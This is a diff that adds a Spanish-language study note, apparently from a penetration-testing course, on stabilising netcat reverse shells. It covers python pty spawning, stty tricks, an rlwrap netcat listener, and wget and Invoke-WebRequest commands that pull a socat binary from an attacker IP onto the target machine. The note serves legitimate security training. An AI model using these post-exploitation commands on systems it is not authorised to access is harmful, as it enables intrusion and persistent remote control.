@@ -3,3 +3,49 @@ layout: apunte
 title: "5. Netcat Shell Stabilisation"
 ---
 
+Nos hemos conectado a la shell, pero ¿ahora qué?
+
+Estas shells son muy inestables: no son interactivas, tienen errores de formato, etc. Esto ocurre porque estas shells no son shells de verdad sino procesos de una terminal. Por suerte, existen varias formas de estabilizarlas.
+
+----------------------------------
+<h2>Técnica 1: Python</h2>
+La primera técnica que veremos es aplicable a entornos Linux ya que tienen instalado Python por defecto. Es un proceso de tres fases:
+
+1. Lo primero que debemos hacer es usar `python -c 'import pty;pty.spawn("/bin/bash")'`. Esto hace que python cree una shell mejorada que corra bash.
+2. Luego hacemos `export TERM=xterm`. Esto nos dará acceso a comandos como `clear`.
+3. Por último (y más importante), ponemos la shell en segundo plano `Ctrl+Z`. En nuestra propia terminal escribimos `stty raw -echo; fg`. Esto hace dos cosas:
+	1. Apaga el echo de nuestra terminal, lo que nos da acceso a autocompletado, flechas de dirección y `Ctrl+C` para matar procesos en la reverse shell.
+	2. Poner la reverse shell en primer plano.
+
+
+>[!CAUTION] Algunos sistemas pueden requerir la versión específica, si `python` no funciona prueba a usar `python2` o `python3`.
+
+!**Pasted image 20251124150453.png**
+
+>[!CAUTION] Si la shell termina, no podremos ver nada en nuestra terminal debido al comando que hemos usado. Para arreglar esto escribe `reset`.
+>
+
+------------------------------------
+<h2>Técnica 2: rlwrap</h2>
+Rlwrap es un programa el cual nos da acceso al historial, autocompletado y las flechas de dirección al recibir una shell. Sin embargo, hay cierta configuración manual necesaria si quieres usar `Ctrl+C` dentro de la shell.
+
+`rlwrap nc -lvnp <puerto>`
+
+Cuando ya la tenemos, usamos `Ctrl+Z` y luego `stty raw -echo;fg` para terminar de estabilizarla.
+
+-----------------------------------------
+<h2>Técnica 3: Socat</h2>
+La tercera manera de estabilizar una shell es usar netcat como método de pivoting para obtener una consola socat, más estable. Esta técnica sólo es útil en Linux, pues en Windows una shell netcat y una socat tienen la misma manera de estabilizarse. Para conseguir este método, primero transladaríamos este archivo [binario](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) a la máquina objetivo. Una forma de hacer esto es servir un servidor en el directorio de tu máquina donde tengas el binario y acceder desde la máquina objetivo a él.
+
+1. `sudo python3 -m http.server 8080` (en tu máquina local).
+2. `wget <ip_atacante:<puerto>>/socat -O /tmp/socat` (en la máquina atacada).
+
+Para conseguir esto en Windows puedes usar `Invoke-WebRequest -uri <ip_atacante:<puerto>>/socat.exe -outfile C:\\Windows\temp\socat.exe`.
+
+--------------------------------
+Cualquiera de estas tres técnicas es útil para cambiar la terminal. Pero si quieres poder abrir un editor de texto en la terminal, deberás hacer lo siguiente:
+
+1. Abre otra terminal y ejecuta `stty -a`. Esto te dará dos valores: rows (filas) y columns (columnas).
+   !**Pasted image 20251124152825.png**
+2. En tu reverse/bind shell ejecuta `stty rows <numero_filas>` y `stty cols <numero_columnas>`.
+
